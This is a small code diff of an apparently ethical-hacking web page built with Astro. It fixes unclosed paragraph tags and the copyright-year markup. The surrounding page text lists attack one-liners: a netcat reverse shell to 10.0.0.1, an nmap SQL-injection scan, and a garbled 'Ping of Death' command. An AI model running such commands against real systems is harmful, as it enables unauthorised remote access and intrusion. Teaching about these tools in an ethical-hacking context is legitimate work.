@@ -51,9 +51,11 @@ import BackToTop from '../../../components/BackToTop.astro';
           <p>
             <b>Reverse Shell Command on <a href="http://netcat.sourceforge.net/">Netcat</a>
             </b> - <code>nc -e /bin/sh 10.0.0.1 1234</code>
+          </p>
           <p>
             <b>
               <a href="https://nmap.org/">Nmap</a> on Kali Linux SQL Injection </b> - <code>nmap --script=http-sql-injection &#60;target&#62;</code>
+          </p>
           <p>
             <b>Ping of Death in “C”</b> - <code>ping &lt;IP Address&gt; -t |65500</code>
           </p>
@@ -67,7 +69,7 @@ import BackToTop from '../../../components/BackToTop.astro';
         </div>
         <hr>
         <div id="copyright">
-          <h6>&copy; <script is:inline src="/scripts/year.js"></script> AT Products LLC</h6>
+          <h6>&copy; {new Date().getFullYear()} AT Products LLC</h6>
           <h6>Ethical Hacking Society is the author and AT Products LLC is publisher of this article/story.</h6>
         </div>
       </Fragment>
